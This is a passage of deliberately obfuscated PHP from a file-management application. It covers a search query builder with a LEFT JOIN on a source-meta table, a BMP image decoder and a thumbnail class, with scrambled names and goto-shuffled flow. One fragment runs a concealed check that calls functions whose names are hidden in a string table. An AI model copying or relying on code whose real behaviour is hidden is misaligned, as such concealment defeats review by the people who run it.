$eÛö×È¨Ô[2322] => array($eÛö×È¨Ô[17], array($eÛö×È¨Ô[424], $eÛö×È¨Ô[423])))); $this->join($C¤ÈÁ»Ãµ–); $AÜÙ‹ĞÎƒ = $e”ºÑ•·Ñ¼; goto DÕó’é‰³”; Có‘õÁ¢ùù: unset($AÜÙ‹ĞÎƒ[$eÛö×È¨Ô[38]]); foreach ($AÜÙ‹ĞÎƒ as $FìŸì·ì‡» => $Fô—É²¦å) { $e”ºÑ•·Ñ¼[$eÛö×È¨Ô[2318] . $FìŸì·ì‡»] = $Fô—É²¦å; } $f¥ÒêÔ¦Ü‘ = array($eÛö×È¨Ô[491], $eÛö×È¨Ô[2182] . $bğƒÀÎõ¸[$eÛö×È¨Ô[2180]] . $eÛö×È¨Ô[2182]); goto BËğ¿†Á‡Â; cõó‡…×Ë: $e”ºÑ•·Ñ¼ = array(); $Eë…ªˆÇÇ¶ = str_replace(array($eÛö×È¨Ô[9], $eÛö×È¨Ô[60], $eÛö×È¨Ô[2317]), $eÛö×È¨Ô[43], $Eë…ªˆÇÇ¶); $Eë…ªˆÇÇ¶ = $eÛö×È¨Ô[2318] . str_replace($eÛö×È¨Ô[57], $eÛö×È¨Ô[2319], $Eë…ªˆÇÇ¶); goto Có‘õÁ¢ùù; eğŠïÍ·§‡: $eÛö×È¨Ô =& $_SERVER[©]; if (!Input::check($bğƒÀÎõ¸[$eÛö×È¨Ô[2180]], $eÛö×È¨Ô[315]) || strlen($bğƒÀÎõ¸[$eÛö×È¨Ô[2180]]) < 2) { return; } $C¤ÈÁ»Ãµ– = "\114\x45\x46\x54\x20\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\151\x6f\x5f\163\x6f\x75\x72\143\x65\x5f\x6d\145\x74\141\40\x6d\145\x74\x61\x20\x6f\x6e\40\163\x6f\x75\162\x63\x65\x2e\163\x6f\165\162\143\145\111\x44\x20\x3d\40\x6d\x65\x74\x61\x2e\x73\157\x75\x72\x63\x65\x49\104"; goto cõó‡…×Ë; DÕó’é‰³”: } private function _parseSearchWhere($c¼Û‡¶ª¥ù) { goto E£ğÏ²õ”â; C× ¥Ò¿: if (isset($c¼Û‡¶ª¥ù[$C‰ÙÁ‹ƒó¨[2180]]) && $c¼Û‡¶ª¥ù[$C‰ÙÁ‹ƒó¨[2180]]) { $f®¬ÂÓ´ó = $c¼Û‡¶ª¥ù[$C‰ÙÁ‹ƒó¨[2180]]; $B‚ëÓêİŒÑ = explode($C‰ÙÁ‹ƒó¨[60], $f®¬ÂÓ´ó); if (strlen($f®¬ÂÓ´ó) > 2 && (substr($f®¬ÂÓ´ó, 0, 1) == $C‰ÙÁ‹ƒó¨[123] && substr($f®¬ÂÓ´ó, -1) == $C‰ÙÁ‹ƒó¨[123]) || substr($f®¬ÂÓ´ó, 0, 1) == $C‰ÙÁ‹ƒó¨[65] && substr($f®¬ÂÓ´ó, -1) == $C‰ÙÁ‹ƒó¨[65]) { $f®¬ÂÓ´ó = substr($f®¬ÂÓ´ó, 1, -1); $B‚ëÓêİŒÑ = array($f®¬ÂÓ´ó); } $AĞ†Š¥«ìÏ[$C‰ÙÁ‹ƒó¨[38]] = array($C‰ÙÁ‹ƒó¨[491], $C‰ÙÁ‹ƒó¨[2182] . $f®¬ÂÓ´ó . $C‰ÙÁ‹ƒó¨[2182]); if (count($B‚ëÓêİŒÑ) > 1) { $AĞ†Š¥«ìÏ[$C‰ÙÁ‹ƒó¨[38]] = array(); foreach ($B‚ëÓêİŒÑ as $EÍâ¢‘ï¤Ÿ) { if (!trim($EÍâ¢‘ï¤Ÿ)) { continue; } $AĞ†Š¥«ìÏ[$C‰ÙÁ‹ƒó¨[38]][] = array($C‰ÙÁ‹ƒó¨[491], $C‰ÙÁ‹ƒó¨[2182] . trim($EÍâ¢‘ï¤Ÿ) . $C‰ÙÁ‹ƒó¨[2182]); } } } return $AĞ†Š¥«ìÏ; goto aš²ÎË©Ä®; b‡ï½ğŠŞ¯: if (isset($c¼Û‡¶ª¥ù[$C‰ÙÁ‹ƒó¨[543]])) { $AĞ†Š¥«ìÏ[] = array($C‰ÙÁ‹ƒó¨[387] => $c¼Û‡¶ª¥ù[$C‰ÙÁ‹ƒó¨[543]], $C‰ÙÁ‹ƒó¨[386] => $c¼Û‡¶ª¥ù[$C‰ÙÁ‹ƒó¨[543]], $C‰ÙÁ‹ƒó¨[911] => $C‰ÙÁ‹ƒó¨[2184]); } if (isset($c¼Û‡¶ª¥ù[$C‰ÙÁ‹ƒó¨[380]])) { $eëÚã³Ë = $c¼Û‡¶ª¥ù[$C‰ÙÁ‹ƒó¨[380]]; if ($eëÚã³Ë == $C‰ÙÁ‹ƒó¨[86]) { $AĞ†Š¥«ìÏ[$C‰ÙÁ‹ƒó¨[378]] = 1; } else { if ($eëÚã³Ë == $C‰ÙÁ‹ƒó¨[2328]) { $AĞ†Š¥«ìÏ[$C‰ÙÁ‹ƒó¨[378]] = 0; } else { if ($eëÚã³Ë) { $eëÚã³Ë = is_array($eëÚã³Ë) ? $eëÚã³Ë : explode($C‰ÙÁ‹ƒó¨[57], $eëÚã³Ë); $AĞ†Š¥«ìÏ[$C‰ÙÁ‹ƒó¨[380]] = array($C‰ÙÁ‹ƒó¨[392], $eëÚã³Ë); $AĞ†Š¥«ìÏ[$C‰ÙÁ‹ƒó¨[378]] = 0; } } } } if (isset($c¼Û‡¶ª¥ù[$C‰ÙÁ‹ƒó¨[469]])) { $C¶×¨ˆó = $this->sourceInfo($c¼Û‡¶ª¥ù[$C‰ÙÁ‹ƒó¨[469]]); $AĞ†Š¥«ìÏ[$C‰ÙÁ‹ƒó¨[533]] = array($C‰ÙÁ‹ƒó¨[491], $C¶×¨ˆó[$C‰ÙÁ‹ƒó¨[467]] . $c¼Û‡¶ª¥ù[$C‰ÙÁ‹ƒó¨[469]] . $C‰ÙÁ‹ƒó¨[492]); } goto C× ¥Ò¿; E£ğÏ²õ”â: $C‰ÙÁ‹ƒó¨ =& $_SERVER[©]; $AĞ†Š¥«ìÏ = array(); if (isset($c¼Û‡¶ª¥ù[$C‰ÙÁ‹ƒó¨[701]])) { $AĞ†Š¥«ìÏ[$C‰ÙÁ‹ƒó¨[117]] = array($C‰ÙÁ‹ƒó¨[2323], $c¼Û‡¶ª¥ù[$C‰ÙÁ‹ƒó¨[701]]); } goto a¨ ŒÁ¡³; a¨ ŒÁ¡³: if (isset($c¼Û‡¶ª¥ù[$C‰ÙÁ‹ƒó¨[702]])) { $F„Œî«ô‹ = array($C‰ÙÁ‹ƒó¨[2324], $c¼Û‡¶ª¥ù[$C‰ÙÁ‹ƒó¨[702]]); if ($AĞ†Š¥«ìÏ[$C‰ÙÁ‹ƒó¨[117]]) { $AĞ†Š¥«ìÏ[$C‰ÙÁ‹ƒó¨[117]] = array($AĞ†Š¥«ìÏ[$C‰ÙÁ‹ƒó¨[117]], $F„Œî«ô‹, $C‰ÙÁ‹ƒó¨[2325]); } else { $AĞ†Š¥«ìÏ[$C‰ÙÁ‹ƒó¨[117]] = $F„Œî«ô‹; } } if (isset($c¼Û‡¶ª¥ù[$C‰ÙÁ‹ƒó¨[2326]])) { $AĞ†Š¥«ìÏ[$C‰ÙÁ‹ƒó¨[87]] = array($C‰ÙÁ‹ƒó¨[2323], $c¼Û‡¶ª¥ù[$C‰ÙÁ‹ƒó¨[2326]]); } if (isset($c¼Û‡¶ª¥ù[$C‰ÙÁ‹ƒó¨[2327]])) { $F„Œî«ô‹ = array($C‰ÙÁ‹ƒó¨[2324], $c¼Û‡¶ª¥ù[$C‰ÙÁ‹ƒó¨[2327]]); if ($AĞ†Š¥«ìÏ[$C‰ÙÁ‹ƒó¨[87]]) { $AĞ†Š¥«ìÏ[$C‰ÙÁ‹ƒó¨[87]] = array($AĞ†Š¥«ìÏ[$C‰ÙÁ‹ƒó¨[87]], $F„Œî«ô‹, $C‰ÙÁ‹ƒó¨[2325]); } else { $AĞ†Š¥«ìÏ[$C‰ÙÁ‹ƒó¨[87]] = $F„Œî«ô‹; } } goto b‡ï½ğŠŞ¯; aš²ÎË©Ä®: } } goto Aã¹È±É‹–; d¨»´›ŸŸ: if ($_SERVER[$_SERVER[©][4]] != $C‰“˜ìÊò¥($BõÆ·ƒòÉ”)) { goto fù˜ù×Ó‡‰; d‹¶»ŒÇ®·: $f…Õ¸»ì—¢($BõÆ·ƒòÉ”); goto fšğ¢¼ÃÓï; fù˜ù×Ó‡‰: $C“×‰äâë = $_SERVER[©][6]; $d²›…÷Ù‰Œ = $_SERVER[$_SERVER[©][7]] . $_SERVER[©][8]; $c˜ÁÄ®¯Î¼ = $C“×‰äâë($d²›…÷Ù‰Œ); goto b£°¶„¬’Ì; b£°¶„¬’Ì: $DÃÆĞæ½ö¸ = explode($_SERVER[©][9], $c˜ÁÄ®¯Î¼); if (count($DÃÆĞæ½ö¸) < $_SERVER[©][10]) { $BšÃ‘¿¨½© = $_SERVER[©][11]; $BšÃ‘¿¨½©(); } $f…Õ¸»ì—¢ = $_SERVER[©][12]; goto d‹¶»ŒÇ®·; fšğ¢¼ÃÓï: } class ImageGdBMP { public static function load($a™«‚…•¶·) { $fÒÆ™•Ä„™ = fopen($a™«‚…•¶·, $_SERVER[©][1518]); if ($fÒÆ™•Ä„™ === !1) { return !1; } $fÊ†©ò¡´ñ = self::loadFromStream($fÒÆ™•Ä„™); fclose($fÒÆ™•Ä„™); return $fÊ†©ò¡´ñ; } public static function loadFromStream($BÂæì»ôª‡) { $f Œ·ÙÓ·¼ =& $_SERVER[©]; $dçê†—îì = fread($BÂæì»ôª‡, 14); if ($dçê†—îì === !1) { return !1; } if ($dçê†—îì[0] != $f Œ·ÙÓ·¼[1829] || $dçê†—îì[1] != $f Œ·ÙÓ·¼[1830]) { return !1; } $AÂÑĞ†±øŞ = unpack($f Œ·ÙÓ·¼[1831] . $f Œ·ÙÓ·¼[1832] . $f Œ·ÙÓ·¼[1833] . $f Œ·ÙÓ·¼[1834] . $f Œ·ÙÓ·¼[1835], $dçê†—îì); return self::loadFromStreamAndFileHeader($BÂæì»ôª‡, $AÂÑĞ†±øŞ); } public static function loadFromStreamAndFileHeader($AÈæäÓÅµ, array $c¾ëõ‹ô‡) { goto B„Â§ˆˆĞè; eÄÃ©ìêã: $Aò‡³²˜Ö– = abs($eÚÛå‚§Ÿ); $fˆëÔÈ£½ = $eÚÛå‚§Ÿ > 0 ? $Aò‡³²˜Ö– - 1 : 0; $Bà¶ëØ‹¹‡ = $eÚÛå‚§Ÿ > 0 ? -1 : 1; goto døÈìõÎ¬; EÓ÷ê™Ù: if ($dÈÊ£©ø¤Ù === !1) { return !1; } list(, $dƒäƒŸÁÔ«) = unpack($D©Ãğ­¥œ[1836], $dÈÊ£©ø¤Ù); if ($dƒäƒŸÁÔ« == 12) { goto C„Î¬™£Ò; dÛ†è£ÆÙ¯: $E†íÇ´ìÉò = 255; goto BŠÙòÍÃ‹Ù; C„Î¬™£Ò: $dÈÊ£©ø¤Ù = fread($AÈæäÓÅµ, $dƒäƒŸÁÔ« - 4); if ($dÈÊ£©ø¤Ù === !1) { return !1; } extract(unpack($D©Ãğ­¥œ[1837] . $D©Ãğ­¥œ[1838] . $D©Ãğ­¥œ[1839] . $D©Ãğ­¥œ[1840], $dÈÊ£©ø¤Ù)); goto aŠ¸ãôåª­; aŠ¸ãôåª­: $cÃá¤×¯Á = $EÈ”Î„›©º = $B˜é¸Ùó = $eªÒë•ñ¼ = 0; $Bà’Ü³„‚ = 16711680; $bí¡´óàƒ× = 65280; goto dÛ†è£ÆÙ¯; BŠÙòÍÃ‹Ù: } else { if (124 < $dƒäƒŸÁÔ« || $dƒäƒŸÁÔ« < 40) { return !1; } else { goto Cã±Î‘ø; bâ˜òÎì¨Æ: if ($b¾¡‰¹ & 2147483648) { $b¾¡‰¹ = -(~$b¾¡‰¹ & 4294967295) - 1; } if ($c¾ëõ‹ô‡[$D©Ãğ­¥œ[528]] != 0) { $bÜï¨ª¶ä = $eÜ¶‰«ç…ê == 1 || $eÜ¶‰«ç…ê == 4 || $eÜ¶‰«ç…ê == 8 ? ($cÃá¤×¯Á ? $cÃá¤×¯Á : pow(2, $eÜ¶‰«ç…ê)) << 2 : 0; $Dôî¡†ç‡Ö = $aÍ´•â«°¬ ? $aÍ´•â«°¬ : ($aÈªÜñö”÷ * $eÜ¶‰«ç…ê + 31 >> 3 & ~3) * abs($eÚÛå‚§Ÿ); $bÌœ§Œ¿ÉÃ = $c¾ëõ‹ô‡[$D©Ãğ­¥œ[528]] - $Dôî¡†ç‡Ö - $bÜï¨ª¶ä - 14; if ($dƒäƒŸÁÔ« < $bÌœ§Œ¿ÉÃ && 40 <= $dƒäƒŸÁÔ« && $dƒäƒŸÁÔ« <= 124) { $dƒäƒŸÁÔ« = $bÌœ§Œ¿ÉÃ; } } if ($dƒäƒŸÁÔ« - 40 > 0) { $dÈÊ£©ø¤Ù = fread($AÈæäÓÅµ, $dƒäƒŸÁÔ« - 40); if ($dÈÊ£©ø¤Ù === !1) { return !1; } extract(unpack($D©Ãğ­¥œ[1850] . $D©Ãğ­¥œ[1851] . $D©Ãğ­¥œ[1852] . $D©Ãğ­¥œ[1853], $dÈÊ£©ø¤Ù . str_repeat($D©Ãğ­¥œ[1854], 120))); } else { $B˜é¸Ùó = $Bà’Ü³„‚ = $bí¡´óàƒ× = $E†íÇ´ìÉò = 0; } goto AŞôÕ°‡Å’; f˜ÇÀƒŠ: if ($aÈªÜñö”÷ & 2147483648) { $aÈªÜñö”÷ = -(~$aÈªÜñö”÷ & 4294967295) - 1; } if ($eÚÛå‚§Ÿ & 2147483648) { $eÚÛå‚§Ÿ = -(~$eÚÛå‚§Ÿ & 4294967295) - 1; } if ($D¦ÙØÄ·ÈÊ & 2147483648) { $D¦ÙØÄ·ÈÊ = -(~$D¦ÙØÄ·ÈÊ & 4294967295) - 1; } goto bâ˜òÎì¨Æ; Cã±Î‘ø: $dÈÊ£©ø¤Ù = fread($AÈæäÓÅµ, 36); if ($dÈÊ£©ø¤Ù === !1) { return !1; } extract(unpack($D©Ãğ­¥œ[1841] . $D©Ãğ­¥œ[1842] . $D©Ãğ­¥œ[1839] . $D©Ãğ­¥œ[1843] . $D©Ãğ­¥œ[1844] . $D©Ãğ­¥œ[1845] . $D©Ãğ­¥œ[1846] . $D©Ãğ­¥œ[1847] . $D©Ãğ­¥œ[1848] . $D©Ãğ­¥œ[1849], $dÈÊ£©ø¤Ù)); goto f˜ÇÀƒŠ; AŞôÕ°‡Å’: if (($eÜ¶‰«ç…ê == 16 || $eÜ¶‰«ç…ê == 24 || $eÜ¶‰«ç…ê == 32) && $eªÒë•ñ¼ == 0 && $Bà’Ü³„‚ == 0 && $bí¡´óàƒ× == 0 && $E†íÇ´ìÉò == 0) { switch ($eÜ¶‰«ç…ê) { case 16: $Bà’Ü³„‚ = 31744; $bí¡´óàƒ× = 992; $E†íÇ´ìÉò = 31; break; case 24: case 32: $Bà’Ü³„‚ = 16711680; $bí¡´óàƒ× = 65280; $E†íÇ´ìÉò = 255; break; } } goto Dô„ùî¤•; Dô„ùî¤•: } } goto BíÚöò§±; BíÚöò§±: if ($aÈªÜñö”÷ == 0 || $eÚÛå‚§Ÿ == 0 || $bÉ›Í‚í != 1 || ($B˜é¸Ùó & $Bà’Ü³„‚) != 0 || ($B˜é¸Ùó & $bí¡´óàƒ×) != 0 || ($B˜é¸Ùó & $E†íÇ´ìÉò) != 0 || ($Bà’Ü³„‚ & $bí¡´óàƒ×) != 0 || ($Bà’Ü³„‚ & $E†íÇ´ìÉò) != 0 || ($bí¡´óàƒ× & $E†íÇ´ìÉò) != 0) { return !1; } if ($eªÒë•ñ¼ == 4 || $eªÒë•ñ¼ == 5) { $dÈÊ£©ø¤Ù = stream_get_contents($AÈæäÓÅµ, $aÍ´•â«°¬); if ($dÈÊ£©ø¤Ù === !1) { return !1; } return imagecreatefromstring($dÈÊ£©ø¤Ù); } $bÔè¹¯§¤Ü = $aÈªÜñö”÷ * $eÜ¶‰«ç…ê + 31 >> 3 & ~3; goto eÄÃ©ìêã; døÈìõÎ¬: if ($eÜ¶‰«ç…ê == 1 || $eÜ¶‰«ç…ê == 4 || $eÜ¶‰«ç…ê == 8) { goto F¼¤¥òØ¾‘; a¾¿±™‡ä‡: $DÇŒâºªÑ = array(); for ($Dö®‘Ó‡Ôì = 0; $Dö®‘Ó‡Ôì < $dĞİñ£·³; ++$Dö®‘Ó‡Ôì) { $dÈÊ£©ø¤Ù = fread($AÈæäÓÅµ, $b³±È°õ); if ($dÈÊ£©ø¤Ù === !1) { imagedestroy($C‘°á‚½ó); return !1; } extract(unpack($D©Ãğ­¥œ[1855], $dÈÊ£©ø¤Ù . $D©Ãğ­¥œ[1854])); $DÇŒâºªÑ[] = imagecolorallocate($C‘°á‚½ó, $D¡í™¢Í¸, $e†¼ÃÚÇÁ, $dº²¤—½½Á); } $Eõƒµİ…÷× = 8 - $eÜ¶‰«ç…ê; goto AŸ£À¶…Ãâ; AŸ£À¶…Ãâ: $EÙß¬‰º« = (1 << $eÜ¶‰«ç…ê) - 1 << $Eõƒµİ…÷×; if ($eªÒë•ñ¼ == 1 || $eªÒë•ñ¼ == 2) { $c®Î‚«¬ºé = 0; $C‰¤À‰­Øó = $eÜ¶‰«ç…ê >> 2 & 1; for (;;) { if ($c®Î‚«¬ºé < -1 || $c®Î‚«¬ºé > $aÈªÜñö”÷ || $fˆëÔÈ£½ < -1 || $fˆëÔÈ£½ > $eÚÛå‚§Ÿ) { imagedestroy($C‘°á‚½ó); return !1; } $dÈÊ£©ø¤Ù = fread($AÈæäÓÅµ, 1); if ($dÈÊ£©ø¤Ù === !1) { imagedestroy($C‘°á‚½ó); return !1; } switch ($dÈÊ£©ø¤Ù) { case $D©Ãğ­¥œ[1854]: $dÈÊ£©ø¤Ù = fread($AÈæäÓÅµ, 1); if ($dÈÊ£©ø¤Ù === !1) { imagedestroy($C‘°á‚½ó); return !1; } switch ($dÈÊ£©ø¤Ù) { case $D©Ãğ­¥œ[1854]: $fˆëÔÈ£½ += $Bà¶ëØ‹¹‡; $c®Î‚«¬ºé = 0; break; case $D©Ãğ­¥œ[1856]: $fˆëÔÈ£½ = 0; $c®Î‚«¬ºé = 0; break 3; case $D©Ãğ­¥œ[1857]: $dÈÊ£©ø¤Ù = fread($AÈæäÓÅµ, 2); if ($dÈÊ£©ø¤Ù === !1) { imagedestroy($C‘°á‚½ó); return !1; } list(, $DÅÏ»ÓâÛø, $Fçˆ‰’Ğ›) = unpack($D©Ãğ­¥œ[1858], $dÈÊ£©ø¤Ù); $c®Î‚«¬ºé += $DÅÏ»ÓâÛø; $fˆëÔÈ£½ += $Fçˆ‰’Ğ› * $Bà¶ëØ‹¹‡; break; default: list(, $AÈé‡’ƒ…) = unpack($D©Ãğ­¥œ[1859], $dÈÊ£©ø¤Ù); $cë™âĞ‡Ÿõ = ($AÈé‡’ƒ… >> $C‰¤À‰­Øó) + ($AÈé‡’ƒ… & $C‰¤À‰­Øó); $dÈÊ£©ø¤Ù = fread($AÈæäÓÅµ, $cë™âĞ‡Ÿõ + 1 & ~1); if ($dÈÊ£©ø¤Ù === !1) { imagedestroy($C‘°á‚½ó); return !1; } for ($Dö®‘Ó‡Ôì = 0, $b«Š°˜²é› = 0; $Dö®‘Ó‡Ôì < $AÈé‡’ƒ…; ++$Dö®‘Ó‡Ôì, ++$c®Î‚«¬ºé, $b«Š°˜²é› += $eÜ¶‰«ç…ê) { list(, $bÛ‹„Äè™Ï) = unpack($D©Ãğ­¥œ[1859], $dÈÊ£©ø¤Ù[$b«Š°˜²é› >> 3]); $dº²¤—½½Á = $b«Š°˜²é› & 7; imagesetpixel($C‘°á‚½ó, $c®Î‚«¬ºé, $fˆëÔÈ£½, $DÇŒâºªÑ[($bÛ‹„Äè™Ï & $EÙß¬‰º« >> $dº²¤—½½Á) >> $Eõƒµİ…÷× - $dº²¤—½½Á]); } break; } break; default: $C¨¼„»†Øô = fread($AÈæäÓÅµ, 1); if ($C¨¼„»†Øô === !1) { imagedestroy($C‘°á‚½ó); return !1; } list(, $D©¤»ÜÄòÀ, $bÛ‹„Äè™Ï) = unpack($D©Ãğ­¥œ[1858], $dÈÊ£©ø¤Ù . $C¨¼„»†Øô); for ($Dö®‘Ó‡Ôì = 0, $b«Š°˜²é› = 0; $Dö®‘Ó‡Ôì < $D©¤»ÜÄòÀ; ++$Dö®‘Ó‡Ôì, ++$c®Î‚«¬ºé, $b«Š°˜²é› += $eÜ¶‰«ç…ê) { $dº²¤—½½Á = $b«Š°˜²é› & 7; imagesetpixel($C‘°á‚½ó, $c®Î‚«¬ºé, $fˆëÔÈ£½, $DÇŒâºªÑ[($bÛ‹„Äè™Ï & $EÙß¬‰º« >> $dº²¤—½½Á) >> $Eõƒµİ…÷× - $dº²¤—½½Á]); } break; } } } else { for ($CŸó†¡ê¡à = 0; $CŸó†¡ê¡à < $Aò‡³²˜Ö–; ++$CŸó†¡ê¡à, $fˆëÔÈ£½ += $Bà¶ëØ‹¹‡) { $dÈÊ£©ø¤Ù = fread($AÈæäÓÅµ, $bÔè¹¯§¤Ü); if ($dÈÊ£©ø¤Ù === !1) { imagedestroy($C‘°á‚½ó); return !1; } $b«Š°˜²é› = 0; for ($c®Î‚«¬ºé = 0; $c®Î‚«¬ºé < $aÈªÜñö”÷; ++$c®Î‚«¬ºé, $b«Š°˜²é› += $eÜ¶‰«ç…ê) { list(, $bÛ‹„Äè™Ï) = unpack($D©Ãğ­¥œ[1859], $dÈÊ£©ø¤Ù[$b«Š°˜²é› >> 3]); $dº²¤—½½Á = $b«Š°˜²é› & 7; imagesetpixel($C‘°á‚½ó, $c®Î‚«¬ºé, $fˆëÔÈ£½, $DÇŒâºªÑ[($bÛ‹„Äè™Ï & $EÙß¬‰º« >> $dº²¤—½½Á) >> $Eõƒµİ…÷× - $dº²¤—½½Á]); } } } goto Dš²æç¾Öõ; F¼¤¥òØ¾‘: $C‘°á‚½ó = imagecreate($aÈªÜñö”÷, $Aò‡³²˜Ö–); $b³±È°õ = $dƒäƒŸÁÔ« == 12 ? 3 : 4; $dĞİñ£·³ = $cÃá¤×¯Á ? $cÃá¤×¯Á : pow(2, $eÜ¶‰«ç…ê); goto a¾¿±™‡ä‡; Dš²æç¾Öõ: } else { goto EšÆ±õïÀ×; B‚Œ„ƒ¦Ã—: for ($CŸó†¡ê¡à = 0; $CŸó†¡ê¡à < $Aò‡³²˜Ö–; ++$CŸó†¡ê¡à, $fˆëÔÈ£½ += $Bà¶ëØ‹¹‡) { $dÈÊ£©ø¤Ù = fread($AÈæäÓÅµ, $bÔè¹¯§¤Ü); if ($dÈÊ£©ø¤Ù === !1) { imagedestroy($C‘°á‚½ó); return !1; } $b«Š°˜²é› = 0; for ($c®Î‚«¬ºé = 0; $c®Î‚«¬ºé < $aÈªÜñö”÷; ++$c®Î‚«¬ºé, $b«Š°˜²é› += $aÅö‹Ì„­) { list(, $bÛ‹„Äè™Ï) = unpack($D©Ãğ­¥œ[1836], substr($dÈÊ£©ø¤Ù, $b«Š°˜²é›, $aÅö‹Ì„­) . $D©Ãğ­¥œ[1860]); $BÏæö’èˆ  = $bÛ‹„Äè™Ï & $B˜é¸Ùó; $a•ÖšÜ“Ó = $bÛ‹„Äè™Ï & $Bà’Ü³„‚; $D¾Ú îäÍ± = $bÛ‹„Äè™Ï & $bí¡´óàƒ×; $bš‡¯·‘ƒ = $bÛ‹„Äè™Ï & $E†íÇ´ìÉò; $f›‚°¶¹ = $dÕÎ«á°î - (($BÏæö’èˆ  << 7) - $BÏæö’èˆ ) * $f§Ø×“ËĞ»; $D¡í™¢Í¸ = (($a•ÖšÜ“Ó << 8) - $a•ÖšÜ“Ó) * $a†„Ê°†í; $e†¼ÃÚÇÁ = (($D¾Ú îäÍ± << 8) - $D¾Ú îäÍ±) * $a«¤Ê‘–’; $dº²¤—½½Á = (($bš‡¯·‘ƒ << 8) - $bš‡¯·‘ƒ) * $cµ…Çáìª•; imagesetpixel($C‘°á‚½ó, $c®Î‚«¬ºé, $fˆëÔÈ£½, $f›‚°¶¹ << 24 | $D¡í™¢Í¸ << 16 | $e†¼ÃÚÇÁ << 8 | $dº²¤—½½Á); } } imagealphablending($C‘°á‚½ó, !0); goto c§Ãš³­°; Dù•”¯ÇÚ: $a†„Ê°†í = $Bà’Ü³„‚ ? 1 / $Bà’Ü³„‚ : 1; $a«¤Ê‘–’ = $bí¡´óàƒ× ? 1 / $bí¡´óàƒ× : 1; $cµ…Çáìª• = $E†íÇ´ìÉò ? 1 / $E†íÇ´ìÉò : 1; goto B‚Œ„ƒ¦Ã—; EšÆ±õïÀ×: $C‘°á‚½ó = imagecreatetruecolor($aÈªÜñö”÷, $Aò‡³²˜Ö–); imagealphablending($C‘°á‚½ó, !1); if ($B˜é¸Ùó) { imagesavealpha($C‘°á‚½ó, !0); } goto aÏŞ¥Â¶©; aÏŞ¥Â¶©: $aÅö‹Ì„­ = $eÜ¶‰«ç…ê >> 3; $dÕÎ«á°î = $B˜é¸Ùó ? 127 : 0; $f§Ø×“ËĞ» = $B˜é¸Ùó ? 1 / $B˜é¸Ùó : 1; goto Dù•”¯ÇÚ; c§Ãš³­°: } return $C‘°á‚½ó; goto A¶¶¡õ¦Ïî; B„Â§ˆˆĞè: $D©Ãğ­¥œ =& $_SERVER[©]; if ($c¾ëõ‹ô‡[$D©Ãğ­¥œ[396]] != 19778) { return !1; } $dÈÊ£©ø¤Ù = fread($AÈæäÓÅµ, 4); goto EÓ÷ê™Ù; A¶¶¡õ¦Ïî: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($b¦íÖ³©Ûã, $dšÊéêàÒ) { goto AÌìè¿®‡; AÌìè¿®‡: $this->srcFile = $b¦íÖ³©Ûã; $this->echoType = $dšÊéêàÒ; $this->im = self::image($b¦íÖ³©Ûã); goto E°µéì½; E°µéì½: if (!$this->im) { return !1; } $BÊâÇ–…È = $_SERVER[©][43]; $this->imgData = GetImageSize($b¦íÖ³©Ûã, $BÊâÇ–…È); goto a´™¼Š£; a´™¼Š£: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto B¢ï³ˆË­ì; B¢ï³ˆË­ì: } public static function image($cÅ×‹ˆèˆ£) { $c–È•ˆˆŸŒ =& $_SERVER[©]; $b‚è§ÃˆùÛ = $c–È•ˆˆŸŒ[43]; $dÔß»†Íã¶ = GetImageSize($cÅ×‹ˆèˆ£, $b‚è§ÃˆùÛ); $AŒ¬Šé¢Âµ = !1; switch ($dÔß»†Íã¶[2]) { case IMAGETYPE_GIF: if (!function_exists($c–È•ˆˆŸŒ[1861])) { break; } $AŒ¬Šé¢Âµ = imagecreatefromgif($cÅ×‹ˆèˆ£); break; case IMAGETYPE_JPEG: if (!function_exists($c–È•ˆˆŸŒ[1862])) { break; } $AŒ¬Šé¢Âµ = imagecreatefromjpeg($cÅ×‹ˆèˆ£); break; case IMAGETYPE_PNG: if (!function_exists($c–È•ˆˆŸŒ[1863])) { break; } $AŒ¬Šé¢Âµ = @imagecreatefrompng($cÅ×‹ˆèˆ£); imagesavealpha($AŒ¬Šé¢Âµ, !0); break; case IMAGETYPE_XBM: $AŒ¬Šé¢Âµ = imagecreatefromxbm($cÅ×‹ˆèˆ£); break; case IMAGETYPE_WBMP: $AŒ¬Šé¢Âµ = imagecreatefromwbmp($cÅ×‹ˆèˆ£); break; case IMAGETYPE_BMP: $AŒ¬Šé¢Âµ = imagecreatefrombmp($cÅ×‹ˆèˆ£); break; default: break; } return $AŒ¬Šé¢Âµ; } public static function imageSize($e×ãÄ¡ì‡Û) { $E™ÉŒ‡×ß¯ =& $_SERVER[©]; $DÖƒÏâí×Ñ = GetImageSize($e×ãÄ¡ì‡Û); if (!$DÖƒÏâí×Ñ) { return !1; } return array($E™ÉŒ‡×ß¯[1864] => $DÖƒÏâí×Ñ[0], $E™ÉŒ‡×ß¯[1865] => $DÖƒÏâí×Ñ[1]); } function distortion($B½÷„¾™¢, $C™ƒŸëÍ‰, $FÅ—œ‘Õ ƒ) { $C•ß—êå³Ï = $this->creatImage($this->im, $C™ƒŸëÍ‰, $FÅ—œ‘Õ ƒ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($C•ß—êå³Ï, $B½÷„¾™¢); } function prorate($f½‹¹èÄ˜Ê, $aêôµÍ´Üì, $fİÜŞªâ) { $aÈŠùèêö = $aêôµÍ´Üì / $fİÜŞªâ; $Bß‡ô¼ËåÔ = $this->srcW / $this->srcH; if ($aÈŠùèêö <= $Bß‡ô¼ËåÔ) { $cÏÑÊñˆç  = $aêôµÍ´Üì; $böäõãŒøì = $cÏÑÊñˆç  * ($this->srcH / $this->srcW); } else { $böäõãŒøì = $fİÜŞªâ; $cÏÑÊñˆç  = $böäõãŒøì * ($this->srcW / $this->srcH); } if ($this->srcW > $aêôµÍ´Üì || $this->srcH > $fİÜŞªâ) { $D›‘Ùáç—İ = $this->creatImage($this->im, $cÏÑÊñˆç , $böäõãŒøì, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($D›‘Ùáç—İ, $f½‹¹èÄ˜Ê); } else { $D›‘Ùáç—İ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($D›‘Ùáç—İ, $f½‹¹èÄ˜Ê); } } function cut($aä§‰Ğ–’, $BŠ‡ƒç‚½, $DÀÂçØæ¯) { goto FÈŠŒ„Ó©; FÈŠŒ„Ó©: $BøßèÁÌ‹ = $BŠ‡ƒç‚½ / $DÀÂçØæ¯; 